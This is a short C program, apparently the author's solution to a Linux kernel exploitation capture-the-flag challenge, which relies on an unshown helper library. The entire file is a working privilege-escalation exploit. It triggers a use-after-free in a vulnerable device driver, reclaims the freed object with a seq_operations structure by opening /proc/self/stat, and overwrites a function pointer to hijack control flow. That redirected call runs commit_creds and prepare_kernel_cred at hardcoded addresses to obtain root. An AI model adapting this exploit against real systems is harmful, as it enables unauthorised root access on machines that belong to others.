#include "libpwn.c"

int main(){
  // Authour Solution
  save_state();
  fd = open(DEV_PATH, O_RDWR);
  if (fd < 0) error("[-] Failed fd open");
  obj_alloc(); 
  obj_free();
  seq_fd = open("/proc/self/stat", O_RDONLY);
  if (seq_fd < 0) error("[-] Failed seq_fd open");
  commit_creds = KADDR(0xffffffff812a1050);
  prepare_kernel_cred =  KADDR(0xffffffff812a11f0);
  printf("[+] commit_creds: %p\n", commit_creds);
  printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);
  char payload[0x8];
  *(size_t *)payload = *(size_t *)escalate_privilege; //RIP Control
  obj_write(payload, sizeof(payload));
  read(seq_fd, payload, 1);
}
